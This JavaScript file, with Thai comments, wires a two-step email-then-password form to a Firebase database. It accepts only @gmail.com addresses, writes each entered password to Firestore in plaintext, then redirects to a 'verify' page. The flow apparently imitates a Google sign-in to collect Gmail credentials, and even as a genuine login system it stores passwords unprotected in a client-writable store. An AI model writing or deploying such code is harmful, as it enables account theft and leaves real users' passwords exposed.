// ✅ Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyCTgAP4Tvlri2-seayJIrC9dpwTA-avZA0",
  authDomain: "loginsystem-7f056.firebaseapp.com",
  projectId: "loginsystem-7f056",
  storageBucket: "loginsystem-7f056.appspot.com",
  messagingSenderId: "1094872135642",
  appId: "1:1094872135642:web:72419f77faf8537c36b2e3",
  measurementId: "G-NT11WXB1W3"
};

// ✅ Init Firebase (compat)
if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}
const db = firebase.firestore();

console.log("🔥 Firebase โหลดสำเร็จ:", firebase);
console.log("📂 Firestore Instance:", db);

// 📌 บันทึกอีเมล (ต้องเป็น @gmail.com เท่านั้น)
function saveEmail() {
  let email = document.getElementById("email").value.trim().toLowerCase();

  // อนุญาตเฉพาะรูปแบบ xxx@gmail.com
  const gmailRegex = /^[a-z0-9._%+-]+@gmail\.com$/;
  if (!gmailRegex.test(email)) {
    alert("กรุณากรอกอีเมลที่ลงท้ายด้วย @gmail.com และรูปแบบถูกต้อง เช่น username@gmail.com");
    return;
  }

  db.collection("users").doc(email).set(
    {
      email: email,
      timestamp: firebase.firestore.FieldValue.serverTimestamp()
    },
    { merge: true }
  )
  .then(() => {
    localStorage.setItem("userEmail", email);
    window.location.href = "password.html";
  })
  .catch(error => {
    console.error("❌ เกิดข้อผิดพลาด:", error);
    alert("บันทึกอีเมลไม่สำเร็จ: " + error.message);
  });
}

// 📌 บันทึกรหัสผ่าน
function savePassword() {
  const password = document.getElementById("password").value.trim();
  const email = localStorage.getItem("userEmail");

  if (!email) {
    alert("ไม่พบอีเมลในระบบ กรุณาเริ่มใหม่");
    window.location.href = "index.html";
    return;
  }
  if (!password) {
    alert("กรุณากรอกรหัสผ่าน");
    return;
  }

  db.collection("users").doc(email).update({ password })
    .then(() => {
      window.location.href = "verify.html";
    })
    .catch(error => {
      console.error("❌ เกิดข้อผิดพลาด:", error);
      alert("บันทึกรหัสผ่านไม่สำเร็จ: " + error.message);
    });
}
